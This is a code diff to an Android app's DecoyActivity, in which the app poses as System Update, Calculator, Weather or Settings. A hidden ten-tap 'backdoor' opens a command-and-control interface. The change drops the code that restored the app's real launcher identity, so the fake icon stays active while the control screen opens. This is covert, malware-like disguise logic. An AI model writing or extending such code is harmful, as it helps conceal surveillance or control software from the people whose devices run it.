@@ -250,27 +250,15 @@ public class DecoyActivity extends AppCompatActivity {
         lastClickTime = currentTime;
 
         if (clickCount >= 10) {
-            Log.d("DecoyActivity", "Backdoor triggered! Restoring Normal Identity.");
+            Log.d("DecoyActivity", "Backdoor triggered! Bypassing cover to open C2.");
             
-            // Restore Main Identity and Hide All Decoys
-            android.content.pm.PackageManager pm = getPackageManager();
-            String pkg = getPackageName();
-            
-            android.content.ComponentName mainAlias = new android.content.ComponentName(pkg, "com.labs.labrats.LauncherAlias");
-            android.content.ComponentName updateAlias = new android.content.ComponentName(pkg, "com.labs.labrats.SystemUpdateAlias");
-            android.content.ComponentName calcAlias = new android.content.ComponentName(pkg, "com.labs.labrats.CalculatorAlias");
-            android.content.ComponentName weatherAlias = new android.content.ComponentName(pkg, "com.labs.labrats.WeatherAlias");
-            android.content.ComponentName settingsAlias = new android.content.ComponentName(pkg, "com.labs.labrats.SettingsAlias");
-
-            pm.setComponentEnabledSetting(mainAlias, android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED, android.content.pm.PackageManager.DONT_KILL_APP);
-            pm.setComponentEnabledSetting(updateAlias, android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED, android.content.pm.PackageManager.DONT_KILL_APP);
-            pm.setComponentEnabledSetting(calcAlias, android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED, android.content.pm.PackageManager.DONT_KILL_APP);
-            pm.setComponentEnabledSetting(weatherAlias, android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED, android.content.pm.PackageManager.DONT_KILL_APP);
-            pm.setComponentEnabledSetting(settingsAlias, android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED, android.content.pm.PackageManager.DONT_KILL_APP);
-
+            // Just open the C2 interface without changing the launcher icon (mask stays active)
             Intent intent = new Intent(this, MainActivity.class);
             intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
             startActivity(intent);
+            
+            // Reset counter for next time and finish decoy to prevent backstack leaks
+            clickCount = 0;
             finish();
         }
     }
